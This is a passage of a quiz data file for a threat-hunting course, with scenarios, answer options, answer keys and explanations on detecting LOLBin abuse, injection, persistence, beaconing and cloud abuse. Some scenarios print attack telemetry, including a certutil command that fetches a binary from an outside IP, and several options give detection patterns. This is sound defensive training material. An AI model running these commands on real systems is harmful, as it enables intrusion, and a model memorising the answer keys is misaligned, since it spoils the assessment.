                  "Confirmation bias — you only searched for evidence that would confirm the hypothesis; rewrite hunts around behavior (TTPs) that would appear regardless of which actor is present, and pre-register disconfirming tests",
                  "Sunk cost — spend more time on it",
                  "Availability bias — buy a new intel feed"
              ],
              correctAnswer: 1,
              explanation: "Filtering exclusively on group-specific IOCs is textbook confirmation bias — IOCs sit at the bottom of the Pyramid of Pain and rotate constantly. Hunt on behavior and design tests that could falsify the hypothesis."
          },
          {
              id: "th-q1-9",
              difficulty: "hard",
              tags: ["HMM4", "Automation"],
              scenario: "Leadership wants to jump from HM2 to HM4 in one quarter by 'automating everything with AI'.",
              question: "Why is that reckless, and what is the realistic path?",
              options: [
                  "It is fine — buy an AI SOC product",
                  "HM4 requires HM3 first: you must first develop and validate novel analytics (HM3) before you can automate them (HM4); automating unvalidated analytics scales false positives and blind spots",
                  "Skip HM3 — nobody actually uses it",
                  "Fire the hunt team and rely on the vendor"
              ],
              correctAnswer: 1,
              explanation: "The HMM levels are cumulative. HM3 = new analytical techniques created by the team; HM4 = those techniques automated into continuous hunting/detection. Skipping HM3 automates noise."
          },
          {
              id: "th-q1-10",
              difficulty: "hard",
              tags: ["Outcomes", "Detection Handoff"],
              scenario: "A hunt confirms an in-the-wild AS-REP roasting technique that your SIEM never alerted on. The finding is written up and the case closed.",
              question: "What is the mandatory next action for the hunt program to actually reduce risk?",
              options: [
                  "Publish a blog post",
                  "Hand the finding to detection engineering with query, data source, false-positive analysis, and MITRE mapping so it becomes a persistent, tuned detection — and log the coverage change on the ATT&CK map",
                  "Wait until the same threat appears again",
                  "Add it to the compliance report only"
              ],
              correctAnswer: 1,
              explanation: "The value of a hunt is only realized when its output is operationalized: a persistent detection, updated coverage map, and shared knowledge. Without the handoff, the same gap will silently re-open."
          }
      ]
  },
  {
      quizId: "th-q2",
      courseId: "threat-hunting",
      title: "Threat Intelligence for Hunters",
      description: "Applied CTI tradecraft: Pyramid of Pain, Diamond Model, enrichment, and turning intel into hunts.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "th-q2-1",
              difficulty: "easy",
              tags: ["Pyramid of Pain"],
              scenario: "A vendor feed drops 4,000 new indicators overnight: 3,600 file hashes, 300 IPs, 80 domains, 15 host artifacts, 4 tool names, 1 TTP writeup on 'WMI persistence via __EventFilter'.",
              question: "Which indicator should you invest hunting effort in first, per David Bianco's Pyramid of Pain?",
              options: [
                  "The 3,600 hashes — highest volume",
                  "The 300 IPs — easiest to block",
                  "The single TTP — TTPs sit at the top of the pyramid: expensive for the adversary to change and durable across campaigns",
                  "The 80 domains — good compromise"
              ],
              correctAnswer: 2,
              explanation: "Hashes and IPs cost the adversary almost nothing to rotate. TTPs force them to retool. One well-written TTP hunt outlives thousands of atomic IOCs."
          },
          {
              id: "th-q2-2",
              difficulty: "easy",
              tags: ["IOC Types"],
              scenario: "During triage you extract: hxxps://cdn-updates[.]top/loader.php, C:\\ProgramData\\svc\\upd.exe, mutex 'Global\\AB92-XX', and JA3 51c64c77e60f3980eea90869b68c58a8.",
              question: "Classify each in order.",
              options: [
                  "All are network IOCs",
                  "Network (URL), Host (file path), Host (mutex), Network (TLS client fingerprint)",
                  "All are host IOCs",
                  "URL=host, file=network, mutex=network, JA3=host"
              ],
              correctAnswer: 1,
              explanation: "Correct classification drives where you hunt: URLs/JA3 in proxy/Zeek/PCAP; paths and mutexes in EDR/Sysmon. Mislabeling wastes queries and misses hits."
          },
          {
              id: "th-q2-3",
              difficulty: "medium",
              tags: ["Diamond Model"],
              scenario: "You have: adversary = FIN7 (attribution medium-confidence), capability = Carbanak backdoor, infrastructure = 3 VPS in EU, victim = your NA retail subsidiary.",
              question: "How does the Diamond Model help you pivot?",
              options: [
                  "It doesn't — it is only theoretical",
                  "It links the four vertices so a change on one (e.g., new C2 IP) can be pivoted to related capability, adversary campaigns, and other victims — enabling hunt expansion and intel sharing",
                  "It replaces MITRE ATT&CK",
                  "It is only for law enforcement"
              ],
              correctAnswer: 1,
              explanation: "The power of the Diamond is pivoting: any vertex leads to the others. A new infrastructure IOC can uncover related capability variants and previously unknown victims."
          },
          {
              id: "th-q2-4",
              difficulty: "medium",
              tags: ["Enrichment"],
              scenario: "A raw IOC arrives: 185.234.219.14. Before hunting on it, you enrich.",
              question: "Which enrichment set adds the most decision value?",
              options: [
                  "GeoIP only",
                  "ASN + hosting provider + passive DNS history + WHOIS + certificate transparency + prior sightings/reputation",
                  "Ping latency to the IP",
                  "Whether it is IPv4 or IPv6"
              ],
              correctAnswer: 1,
              explanation: "Actionable enrichment answers 'is this shared hosting or dedicated?', 'what domains have resolved here?', 'what TLS certs did it serve?', 'have we or peers seen it before?'. That drives severity, scope, and pivot."
          },
          {
              id: "th-q2-5",
              difficulty: "medium",
              tags: ["Intel Levels"],
              scenario: "The board wants a briefing. The SOC wants blockable data. The detection engineer wants campaign write-ups with malware behavior.",
              question: "Match each consumer to the right intel level.",
              options: [
                  "Board=tactical, SOC=strategic, DE=operational",
                  "Board=strategic (trends, risk), SOC=tactical (IOCs to block/alert), Detection Engineer=operational (campaigns, TTPs, tooling)",
                  "All three want strategic",
                  "All three want tactical"
              ],
              correctAnswer: 1,
              explanation: "Strategic = who/why/trends for leadership. Operational = campaigns and TTPs for engineers and hunters. Tactical = atomic IOCs for immediate blocking and alerting."
          },
          {
              id: "th-q2-6",
              difficulty: "medium",
              tags: ["YARA"],
              scenario: "You have three samples of a loader that share a rare 22-byte decryption stub and a distinctive PDB path, but each has a unique hash and different C2.",
              question: "What is the correct detection artifact to build, and why?",
              options: [
                  "One SHA256 per sample",
                  "A YARA rule matching the 22-byte stub AND the PDB substring, with a condition tuned to minimize FPs — catches current and future variants regardless of hash",
                  "Block the C2 IPs only",
                  "Nothing — hashes are enough"
              ],
              correctAnswer: 1,
              explanation: "YARA lets you encode structural or behavioral traits that survive minor variant churn. Hashes and IPs would miss the next build 24 hours later."
          },
          {
              id: "th-q2-7",
              difficulty: "medium",
              tags: ["Indicator Fatigue"],
              scenario: "Your TIP auto-ingests 12 feeds, dedups to ~180k active indicators, and pushes all of them to the SIEM as high-severity alerts. Analysts are drowning.",
              question: "What is the correct fix?",
              options: [
                  "Buy more feeds",
                  "Score indicators (source reliability, indicator confidence, age, prevalence, exposure to your assets), expire aggressively, and only alert on the top-scored + relevant subset; the rest is enrichment context, not alerts",
                  "Alert on everything but louder",
                  "Turn off all feeds"
              ],
              correctAnswer: 1,
              explanation: "Not every indicator deserves an alert. Score, decay, and filter to what is relevant to your environment. Use the rest for enrichment/context on other alerts."
          },
          {
              id: "th-q2-8",
              difficulty: "hard",
              tags: ["F3EAD", "Intel-to-Hunt"],
              scenario: "You are operationalizing the F3EAD cycle inside the hunt team. A finished intel product (Finish) has just landed describing a new webshell family.",
              question: "What are the correct next two phases and their concrete artifacts?",
              options: [
                  "Exploit and Analyze — extract IOCs/TTPs/YARA/Sigma from the intel, then produce hunt queries, detection candidates, and updated TIP entries; Disseminate closes the loop back to intel and detection engineering",
                  "Skip straight to Disseminate",
                  "F3EAD is only for the military",
                  "Repeat Find forever"
              ],
              correctAnswer: 0,
              explanation: "F3EAD = Find, Fix, Finish, Exploit, Analyze, Disseminate. Exploit/Analyze is where raw intel becomes actionable hunt queries, detections, and enrichment; Disseminate hands artifacts to the consumers."
          },
          {
              id: "th-q2-9",
              difficulty: "hard",
              tags: ["Attribution", "Bias"],
              scenario: "An intel vendor attributes an intrusion to a nation-state group with 'high confidence' based on shared infrastructure with a 2019 campaign.",
              question: "How should the hunt team consume this attribution?",
              options: [
                  "Treat it as ground truth and hunt only that group's TTPs",
                  "Treat attribution as a hypothesis with uncertainty; hunt on the observed TTPs and infrastructure regardless of attribution, and avoid narrowing the aperture — false attribution biases queries and misses co-tenants of shared infra",
                  "Ignore the intel entirely",
                  "Escalate to law enforcement immediately"
              ],
              correctAnswer: 1,
              explanation: "Attribution is inherently uncertain, and shared infrastructure is routinely reused across unrelated crews. Hunt the behavior; do not let a label collapse the search space."
          },
          {
              id: "th-q2-10",
              difficulty: "hard",
              tags: ["MISP", "Sharing"],
              scenario: "You discover a novel PowerShell downloader used against your org. Legal has cleared TLP:AMBER sharing with your sector ISAC.",
              question: "What is the correct package to publish?",
              options: [
                  "Just the SHA256",
                  "A structured MISP event with hashes, C2, TTPs (ATT&CK IDs), YARA, Sigma, victim sector, TLP marking, and confidence — enabling peers to detect and pivot without leaking sensitive victim detail",
                  "A screenshot of the alert",
                  "Nothing — sharing is risky"
              ],
              correctAnswer: 1,
              explanation: "Structured sharing (MISP/STIX) with atomic IOCs, behavior (YARA/Sigma), ATT&CK mapping, and TLP marking maximizes peer detection while controlling disclosure. Sector-wide detection is collective defense."
          }
      ]
  },
  {
      quizId: "th-q3",
      courseId: "threat-hunting",
      title: "Techniques & Tradecraft",
      description: "Deep-dive on adversary tradecraft: LOLBins, injection, TLS fingerprinting, evasion, and how to hunt each.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "th-q3-1",
              difficulty: "easy",
              tags: ["LOLBins"],
              scenario: "Sysmon EID 1: `certutil.exe -urlcache -split -f http://45.9.148.99/x.bin C:\\Users\\Public\\x.bin` on a finance workstation.",
              question: "What is this and how do you hunt it broadly?",
              options: [
                  "Normal Windows patching",
                  "LOLBin abuse (certutil as a downloader); hunt EID 1 for cmdline regex on `certutil.*urlcache|split|-f\\s+https?://` across all endpoints and stack-rank rare parent processes",
                  "A false positive from AV",
                  "A driver install"
              ],
              correctAnswer: 1,
              explanation: "certutil's -urlcache is one of the most abused LOLBAS entries. The correct hunt is command-line pattern + rare parent stack-rank, not blocking certutil (breaks legitimate PKI work)."
          },
          {
              id: "th-q3-2",
              difficulty: "easy",
              tags: ["Parent-Child"],
              scenario: "Process tree observed: WINWORD.EXE → cmd.exe → powershell.exe -enc <base64>.",
              question: "What is the primary hunt signal here?",
              options: [
                  "cmd.exe running — always malicious",
                  "The anomalous parent-child chain: an Office app spawning a shell that spawns encoded PowerShell is a textbook macro/loader pattern — hunt on Office_App → cmd|powershell|wscript|mshta with encoded flags across the fleet",
                  "PowerShell is banned outright",
                  "WINWORD is deprecated"
              ],
              correctAnswer: 1,
              explanation: "The signal is the chain, not any single binary. Office apps almost never legitimately spawn shells with encoded payloads. This is the canonical initial-access to execution pivot."
          },
          {
              id: "th-q3-3",
              difficulty: "medium",
              tags: ["JA3/JA3S"],
              scenario: "Proxy logs are blind to payloads (TLS 1.3), but Zeek is capturing ssl.log with JA3/JA3S. You see JA3 `72a589da586844d7f0818ce684948eea` beaconing every 63s from 14 endpoints to disparate IPs and domains.",
              question: "What is the value of the JA3 fingerprint here?",
              options: [
                  "None — TLS is encrypted",
                  "JA3 hashes the TLS client-hello parameters, so the same client library/tool produces the same JA3 across different destinations — perfect for pivoting on tooling (e.g., a specific implant) independent of C2 rotation",
                  "It reveals the certificate CN",
                  "It only works on HTTP"
              ],
              correctAnswer: 1,
              explanation: "JA3 pivots on the client stack. A rare JA3 across many endpoints beaconing on a fixed cadence is a strong C2 signal — infrastructure can rotate but the client fingerprint persists until the operator retools."
          },
          {
              id: "th-q3-4",
              difficulty: "medium",
              tags: ["Process Hollowing"],
              scenario: "EDR telemetry shows svchost.exe started with `CREATE_SUSPENDED`, then WriteProcessMemory + SetThreadContext + ResumeThread from an unrelated parent.",
              question: "Which technique is this and what is the durable hunt?",
              options: [
                  "Normal service start",
                  "Process hollowing (T1055.012); hunt for CreateProcess(SUSPENDED) followed by WriteProcessMemory/NtUnmapViewOfSection + SetThreadContext against target images that legitimately never get hollowed (svchost, notepad, RegAsm)",
                  "A debugger session",
                  "Antivirus quarantine"
              ],
              correctAnswer: 1,
              explanation: "The API sequence Create(SUSPENDED) → Unmap/Write → SetContext → Resume is the hollowing signature. Hunting the API pattern on common target binaries survives obfuscation of the loader itself."
          },
          {
              id: "th-q3-5",
              difficulty: "medium",
              tags: ["MITRE ATT&CK Tactics"],
              scenario: "You catch an actor creating a scheduled task `\\Microsoft\\Windows\\Defender\\Refresh` that runs a payload from ProgramData every 60 minutes.",
              question: "Which tactic is this, and what is the correct hunt query family?",
              options: [
                  "Impact — hunt for encryption",
                  "Persistence (T1053.005 Scheduled Task); hunt EID 4698/Sysmon 4702/schtasks.exe with task paths mimicking Microsoft, non-Microsoft-signed action binaries, and tasks created by non-admin sessions",
                  "Reconnaissance — hunt DNS",
                  "Exfiltration — hunt uploads"
              ],
              correctAnswer: 1,
              explanation: "Scheduled tasks are the #1 non-registry persistence. Hunt on task path masquerading + action binary signature + creator identity — not on the mere existence of scheduled tasks."
          },
          {
              id: "th-q3-6",
              difficulty: "medium",
              tags: ["DLL Side-loading"],
              scenario: "A signed vendor executable in `C:\\ProgramData\\Vendor\\app.exe` loads `version.dll` from its own directory instead of System32. The DLL is unsigned and 47 KB.",
              question: "What is this, and what is the fleet-wide hunt?",
              options: [
                  "Normal DLL loading",
                  "DLL search-order hijack / side-loading (T1574.002); hunt Sysmon EID 7 for known-signed images loading unsigned DLLs with common Windows names (version.dll, dbghelp.dll, winhttp.dll) from non-System32 paths, then stack-rank rare pairs",
                  "A Windows Update",
                  "A driver signing bypass"
              ],
              correctAnswer: 1,
              explanation: "Side-loading abuses the DLL search order. The generalizable hunt is 'signed EXE loading unsigned same-name Windows DLL from its own folder' — stack-ranked rare pairs surface novel abuses."
          },
          {
              id: "th-q3-7",
              difficulty: "medium",
              tags: ["Fileless"],
              scenario: "PowerShell EID 4104 shows a large base64 blob decoded and executed via `[Reflection.Assembly]::Load($bytes)`. No file is written.",
              question: "What class of technique is this, and what is the primary telemetry to hunt on?",
              options: [
                  "It cannot be detected",
                  "Reflective/in-memory .NET load (T1055/T1620); hunt Script Block Logging (4104) + AMSI events + Sysmon Image Load of clr.dll into unusual hosts (e.g., powershell_ise, wscript) with high-entropy blobs",
                  "It is a file infector",
                  "It is a boot sector attack"
              ],
              correctAnswer: 1,
              explanation: "Fileless execution defeats disk AV, but AMSI + Script Block Logging + CLR image-load telemetry make it very hunt-able. Entropy and unusual CLR hosts are the strongest signals."
          },
          {
              id: "th-q3-8",
              difficulty: "hard",
              tags: ["Timestomping"],
              scenario: "You find `payload.exe` in `C:\\Windows\\System32\\` with $STANDARD_INFORMATION Created = 2009-07-14 (matches Windows install date), but $FILE_NAME Created = last Tuesday. MFT record number is very recent.",
              question: "What has happened and how do you generalize the hunt?",
              options: [
                  "Legitimate system file",
                  "Timestomping (T1070.006): $SI is trivially settable while $FN is written by the kernel on rename/create; hunt for files where $SI < $FN or where timestamps cluster on suspicious round values, prioritizing System32 and recent MFT records",
                  "Filesystem corruption",
                  "A clock drift issue"
              ],
              correctAnswer: 1,
              explanation: "$SI vs $FN divergence is the classic timestomp tell. The MFT record number gives ground truth for actual creation order — durable regardless of what the attacker sets."
          },
          {
              id: "th-q3-9",
              difficulty: "hard",
              tags: ["Sysmon Config"],
              scenario: "Your Sysmon config logs process creation but excludes command lines >2KB for 'performance'. Attackers move to giant encoded PowerShell one-liners and your hunts go blind.",
              question: "What is the correct fix and hunt compensation?",
              options: [
                  "Leave the exclusion — performance matters more",
                  "Remove the cmdline length exclusion (it is directly exploited as an evasion); enable EID 4104 Script Block Logging, EID 1 with full cmdline, and add a hunt for extreme cmdline lengths and high base64 ratios as a first-class signal",
                  "Disable Sysmon",
                  "Only log EID 3"
              ],
              correctAnswer: 1,
              explanation: "Any deterministic filter in Sysmon becomes an evasion primitive. Adversaries deliberately shape traffic below or above thresholds. Extreme cmdline length + entropy is itself a hunt signal."
          },
          {
              id: "th-q3-10",
              difficulty: "hard",
              tags: ["Living-off-the-Cloud"],
              scenario: "C2 traffic is going to `raw.githubusercontent.com` and `bin.pastes.dev`. Proxy allows both. No malware on disk.",
              question: "What is the tradecraft and the correct hunt?",
              options: [
                  "Developers being developers — ignore",
                  "Living-off-Trusted-Sites / dead-drop resolvers: hunt for non-developer endpoints (finance/HR) fetching raw content from code/paste sites, endpoints polling at fixed intervals, and processes other than browsers/dev tools issuing these requests",
                  "Block GitHub for the whole company",
                  "Trust the TLS cert"
              ],
              correctAnswer: 1,
              explanation: "Trusted-site abuse defeats reputation and TLS inspection. The hunt is contextual: who is asking, from which process, on what cadence — not the destination alone."
          }
      ]
  },
  {
      quizId: "th-q4",
      courseId: "threat-hunting",
      title: "Endpoint Hunting",
      description: "Applied endpoint tradecraft: process trees, autoruns, event IDs, and memory forensics under real telemetry.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "th-q4-1",
              difficulty: "easy",
              tags: ["Process Trees"],
              scenario: "You are handed 24 hours of raw Sysmon EID 1 from 3,000 endpoints (~40M events) and told 'find evil'.",
              question: "What is the highest-yield first pass?",
              options: [
                  "Look at every event",
                  "Aggregate on parent→child pairs, stack-rank ascending, and hunt the long tail of rare pairs (e.g., winword→cmd, sqlservr→whoami, spoolsv→powershell)",
                  "Filter to signed binaries only",
                  "Query for the word 'malware'"
              ],
              correctAnswer: 1,
              explanation: "Least-frequency-of-occurrence on parent-child is the workhorse endpoint hunt. Attackers must eventually create anomalous ancestry that has no legitimate business analogue."
          },
          {
              id: "th-q4-2",
              difficulty: "easy",
              tags: ["Suspicious Parents"],
              scenario: "Which of the following process pairs is the strongest indicator of compromise on a Windows workstation?",
              question: "Pick the most suspicious pair.",
              options: [
                  "explorer.exe → chrome.exe",
                  "services.exe → svchost.exe",
                  "winword.exe → cmd.exe → powershell.exe -w hidden -enc ...",
                  "cmd.exe → ipconfig.exe"
              ],
              correctAnswer: 2,
              explanation: "Office → shell → hidden encoded PowerShell is the textbook macro-loader chain. The others are all expected system behavior."
          },
          {
              id: "th-q4-3",
              difficulty: "easy",
              tags: ["Autoruns"],
              scenario: "You need to enumerate persistence on a suspect host without an EDR agent installed.",
              question: "Which single tool covers the most persistence surface?",
              options: [
                  "Task Manager",
                  "Sysinternals Autoruns — enumerates Run keys, services, drivers, scheduled tasks, WMI subscriptions, LSA providers, AppInit_DLLs, image hijacks, Office add-ins, and more, with signature checks and VT lookup",
                  "regedit alone",
                  "netstat"
              ],
              correctAnswer: 1,
              explanation: "Autoruns is the canonical persistence enumerator. Pair with 'Hide Microsoft-signed' to collapse to the long tail worth reviewing."
          },
          {
              id: "th-q4-4",
              difficulty: "medium",
              tags: ["Unsigned + Temp"],
              scenario: "An unsigned 62KB PE named `svchost.exe` runs from `C:\\Users\\Public\\Downloads\\` with parent `explorer.exe`, then makes an outbound TLS connection to a 3-day-old domain.",
              question: "Which properties together give this its very high suspicion score?",
              options: [
                  "Only the domain age",
                  "Masquerading (system name in user path) + unsigned + user-writable location + young infrastructure + non-service parent — no single one is proof, but the combination is a high-fidelity behavioral cluster",
                  "Only that it is 62KB",
                  "Only the parent process"
              ],
              correctAnswer: 1,
              explanation: "Hunting compounds weak signals into strong composites. Any one property is noisy; the combination is nearly deterministic — this is the basis for behavioral scoring detections."
          },
          {
              id: "th-q4-5",
              difficulty: "medium",
              tags: ["Stack Ranking"],
              scenario: "You want to find rare service binaries across 10,000 hosts. Most services are Microsoft-signed and appear on ~all hosts.",
              question: "How do you stack-rank correctly?",
              options: [
                  "Count events per host — highest wins",
                  "Group by (image path, signer, size) and count DISTINCT hosts; sort ascending; the services present on the fewest hosts (long tail) are the hunt targets",
                  "Only look at services on one host",
                  "Ignore signing"
              ],
              correctAnswer: 1,
              explanation: "Distinct-host counts prevent a single noisy machine from skewing rankings. Least-common-across-fleet is the anomaly you want."
          },
          {
              id: "th-q4-6",
              difficulty: "medium",
              tags: ["EID 4688 vs Sysmon EID 1"],
              scenario: "You have both native Windows Security EID 4688 (with cmdline auditing enabled) and Sysmon EID 1.",
              question: "Which offers more hunt value and why?",
              options: [
                  "They are identical",
                  "Sysmon EID 1 — adds file hashes (MD5/SHA1/SHA256/IMPHASH), original filename, parent image full path, ProcessGUID for durable pivoting, signature status, and richer parent lineage; 4688 lacks these",
                  "4688 — only official Microsoft event",
                  "Neither — use ETW only"
              ],
              correctAnswer: 1,
              explanation: "Sysmon's added fields (especially IMPHASH and ProcessGUID) enable pivots that raw 4688 cannot. Best practice is to run both."
          },
          {
              id: "th-q4-7",
              difficulty: "medium",
              tags: ["Scheduled Tasks"],
              scenario: "New scheduled task `\\Microsoft\\Windows\\UpdateOrchestrator\\Reboot-Aux` running `wscript.exe C:\\Users\\bob\\AppData\\Roaming\\upd.js` every 47 minutes, created by user 'bob'.",
              question: "What are the three strongest suspicion signals?",
              options: [
                  "It runs every 47 minutes only",
                  "Microsoft-path masquerading + action binary in user-writable AppData + created by an interactive user account (not SYSTEM/admin/GPO) — combined this is high-fidelity persistence",
                  "wscript.exe is banned",
                  "The task name is too long"
              ],
              correctAnswer: 1,
              explanation: "Path masquerading, user-writable payload, and unusual creator identity are the durable signals. Hunt on the combination via EID 4698 and TaskCache registry."
          },
          {
              id: "th-q4-8",
              difficulty: "hard",
              tags: ["Memory Forensics"],
              scenario: "EDR is blind to a suspected in-memory implant. You have a full memory image and Volatility 3.",
              question: "Which plugin sequence best surfaces injected/fileless code?",
              options: [
                  "windows.pslist only",
                  "windows.pslist + windows.psscan (unlinked) + windows.malfind (RWX private regions with PE headers) + windows.ldrmodules (unlinked DLLs) + windows.netscan (hidden connections)",
                  "windows.filescan only",
                  "windows.registry.hivelist only"
              ],
              correctAnswer: 1,
              explanation: "malfind + ldrmodules + psscan cross-check the loader for injected code and unlinked artifacts; netscan surfaces sockets missed by live tools. This is the standard implant hunt in Volatility."
          },
          {
              id: "th-q4-9",
              difficulty: "hard",
              tags: ["WMI Persistence"],
              scenario: "You suspect a __EventFilter → __EventConsumer → __FilterToConsumerBinding persistence chain on 4 hosts.",
              question: "Where do you hunt, and what is the most durable telemetry?",
              options: [
                  "Only Security EID 4624",
                  "Microsoft-Windows-WMI-Activity/Operational EID 5861 (permanent event consumer created) + querying root\\subscription classes remotely; Sysmon EID 19/20/21 also captures WMI subscription events with cmdline context",
                  "DNS logs",
                  "Firewall logs"
              ],
              correctAnswer: 1,
              explanation: "WMI-Activity 5861 and Sysmon 19-21 are the canonical WMI persistence signals. Hunt across every host for any 5861 that is not from a known GPO/imaging pipeline."
          },
          {
              id: "th-q4-10",
              difficulty: "hard",
              tags: ["LSASS Access"],
              scenario: "Sysmon EID 10: source=`rundll32.exe`, target=`lsass.exe`, GrantedAccess=0x1010, CallTrace includes `UNKNOWN` module in RWX memory.",
              question: "What is happening and what is the safest hunt query family?",
              options: [
                  "Windows crash reporting",
                  "Credential dumping (T1003.001) via reflective loader; hunt EID 10 targeting lsass with GrantedAccess masks 0x1010/0x1410/0x1438 and unsigned/unknown-module CallTrace, from any non-allowlisted source process — tune, do not disable",
                  "Nothing suspicious",
                  "Chrome auto-update"
              ],
              correctAnswer: 1,
              explanation: "The GrantedAccess mask (VMRead|PROCESS_QUERY_INFO) plus UNKNOWN CallTrace module is a well-known Mimikatz-family signal. LSASS access hunts are noisy but tunable via caller allowlisting."
          }
      ]
  },
  {
      quizId: "th-q5",
      courseId: "threat-hunting",
      title: "Network & Cloud Hunting",
      description: "Applied network and cloud tradecraft: beaconing, DNS tunneling, east-west lateral movement, and control-plane abuse.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "th-q5-1",
              difficulty: "easy",
              tags: ["Beaconing"],
              scenario: "Zeek conn.log shows host 10.42.7.19 connecting to 91.234.55.77:443 every 60±3 seconds for 6 hours, average 812 bytes out / 1.1KB in per connection.",
              question: "What is the primary hunt signal and how do you generalize it?",
              options: [
                  "Cron job — safe",
                  "Periodic beaconing with low jitter and small, symmetric payload size; generalize by computing inter-arrival time coefficient of variation per (src, dst, port) and alerting on low CoV + long duration + small bytes",
                  "Windows Update",
                  "NTP"
              ],
              correctAnswer: 1,
              explanation: "The durable behavioral signal is low temporal variance over many intervals with small, uniform payloads. CoV of inter-arrival times is the standard statistical hunt."
          },
          {
              id: "th-q5-2",
              difficulty: "easy",
              tags: ["DNS Tunneling"],
              scenario: "DNS logs show queries like `a3b8c1d9e7...f4.tun.example[.]net` where the leftmost label averages 48 chars and Shannon entropy 4.8 bits/char, at ~14 queries/second from one host.",
              question: "What are you seeing and what is the fleet hunt?",
              options: [
                  "CDN lookups",
                  "DNS tunneling: hunt per-host distinct-subdomain counts, mean label length, label entropy, and QPS to any single 2LD; alert on top percentile — durable regardless of the specific TXT/A/CNAME encoding used",
                  "Anti-virus updates",
                  "reverse DNS"
              ],
              correctAnswer: 1,
              explanation: "Length, entropy, per-2LD subdomain cardinality, and QPS together are the canonical DNS-tunneling signal. Payload-specific rules miss variants."
          },
          {
              id: "th-q5-3",
              difficulty: "medium",
              tags: ["Long-tail"],
              scenario: "You aggregate proxy logs by destination domain over 30 days across 20k users. 99% of traffic goes to ~5,000 domains. The remaining 1% goes to 380,000 unique domains, mostly one-request-ever.",
              question: "Where does hunting value concentrate and why?",
              options: [
                  "The top 5,000 — most traffic",
                  "The long tail: rare/one-off destinations are where DGA, exfil dead-drops, and single-victim C2 hide; enrich with domain age, WHOIS, ASN reputation, and unique-user count to prioritize",
                  "Middle of the distribution",
                  "Random sample"
              ],
              correctAnswer: 1,
              explanation: "The head is your business baseline; the tail is where adversary infrastructure hides by design. Enrichment collapses 380k into a triageable few hundred."
          },
          {
              id: "th-q5-4",
              difficulty: "medium",
              tags: ["Egress Protocols"],
              scenario: "Your egress firewall allows DNS to anywhere, HTTPS to anywhere via proxy (no MITM), and blocks everything else outbound.",
              question: "Where is exfiltration most likely to hide and how do you monitor it?",
              options: [
                  "SSH — but it is blocked",
                  "DNS (rarely deeply inspected) and HTTPS (encrypted, allowed to trusted sites); monitor DNS with volumetric/entropy analytics per host, and HTTPS via JA3/SNI/upload-byte anomalies and destination reputation",
                  "IRC",
                  "SMB to the internet"
              ],
              correctAnswer: 1,
              explanation: "Adversaries follow policy: they exfil through whatever is permitted. DNS and HTTPS are the two universally permitted egress channels and therefore the two universal hunt surfaces."
          },
          {
              id: "th-q5-5",
              difficulty: "medium",
              tags: ["Cloud Audit Logs"],
              scenario: "You are asked to hunt for cloud identity abuse across AWS, Azure, and GCP.",
              question: "What is the single most important log source in each?",
              options: [
                  "VPC Flow only",
                  "AWS CloudTrail (management events), Azure Activity Log + Entra ID Sign-In/Audit, GCP Cloud Audit Logs (Admin Activity + Data Access) — the control-plane API record is the ground truth for identity and configuration abuse",
                  "OS logs on the VMs",
                  "Billing logs"
              ],
              correctAnswer: 1,
              explanation: "Cloud attacks are API attacks. The provider control-plane audit log is the definitive record — VPC/flow and OS logs are complementary, not substitutes."
          },
          {
              id: "th-q5-6",
              difficulty: "medium",
              tags: ["Data Exfil"],
              scenario: "One workstation uploads 8 GB over TLS to a single IP between 02:00 and 04:00 local time. Normal daily upload for that host is <80 MB.",
              question: "What is the hunt signal set?",
              options: [
                  "Upload volume alone is not evidence",
                  "Composite: upload-bytes z-score vs per-host baseline + out-of-hours + single-destination concentration + destination reputation/age — one-signal alerts on volume alone are noisy; the composite is high-fidelity",
                  "Ignore — probably a backup",
                  "Alert on any TLS upload"
              ],
              correctAnswer: 1,
              explanation: "Per-host baselining is essential; a 100x deviation combined with off-hours and destination context is the standard exfil hunt. Static thresholds either miss or drown you."
          },
          {
              id: "th-q5-7",
              difficulty: "medium",
              tags: ["East-West"],
              scenario: "Your NDR is entirely north-south. An adversary lands via phishing and moves via SMB and WinRM between workstations for weeks.",
              question: "What is the fix and the primary hunt?",
              options: [
                  "Buy more north-south sensors",
                  "Instrument east-west telemetry (TAPs at core, Zeek on internal segments, Windows 5140/5145 SMB share access, WinRM/WSMan 6/91, Sysmon EID 3 for internal dest); hunt for workstation→workstation SMB/RPC/WinRM which is abnormal in most environments",
                  "Ignore internal traffic",
                  "Only monitor DCs"
              ],
              correctAnswer: 1,
              explanation: "Lateral movement is invisible without east-west visibility. Workstation-to-workstation admin protocols are rare by policy and a high-fidelity lateral-movement signal."
          },
          {
              id: "th-q5-8",
              difficulty: "hard",
              tags: ["Cloud Misconfig"],
              scenario: "You need to continuously hunt for newly-public S3 buckets and Azure blob containers across 42 accounts/subscriptions.",
              question: "What is the correct hunt architecture?",
              options: [
                  "Manual weekly review",
                  "CloudTrail/Activity event-driven detection on PutBucketAcl/PutBucketPolicy/SetContainerAcl API calls that result in Public/AllUsers grants, plus periodic drift scans via config service (AWS Config / Azure Policy / GCP SCC) — event + posture together",
                  "Trust the developers",
                  "Only scan production"
              ],
              correctAnswer: 1,
              explanation: "Event-driven detection catches misconfigurations at the moment of change; posture management catches drift and historic state. Both are needed."
          },
          {
              id: "th-q5-9",
              difficulty: "hard",
              tags: ["Impossible Travel"],
              scenario: "Entra ID sign-in log: user@corp signed in from Berlin at 09:00 UTC and Seoul at 09:20 UTC — implied ground speed ~28,000 km/h.",
              question: "What is the correct handling, given both sessions used the same corporate laptop UA?",
              options: [
                  "Reset password immediately without checking",
                  "Treat as high-severity credential/session compromise candidate but first enrich with IP → ASN (VPN/proxy?), device compliance, MFA claim, session token reuse (same refresh_token in both?); impossible travel + token replay = confirmed AiTM/token theft",
                  "Ignore — probably a VPN",
                  "Wait for the user to complain"
              ],
              correctAnswer: 1,
              explanation: "Impossible-travel alone has FPs from VPNs. Pair with token/session artifacts to distinguish benign VPN egress from adversary-in-the-middle token replay — a rising 2025 pattern."
          },
          {
              id: "th-q5-10",
              difficulty: "hard",
              tags: ["TLS Cert Anomalies"],
              scenario: "You pull cert observations from Zeek x509.log for 30 days: most certs are LetsEncrypt or DigiCert, valid 90+ days. You spot 42 destinations serving self-signed certs with subject CN 'localhost' and 7-day validity.",
              question: "What is the hunt logic?",
              options: [
                  "Self-signed always means malware",
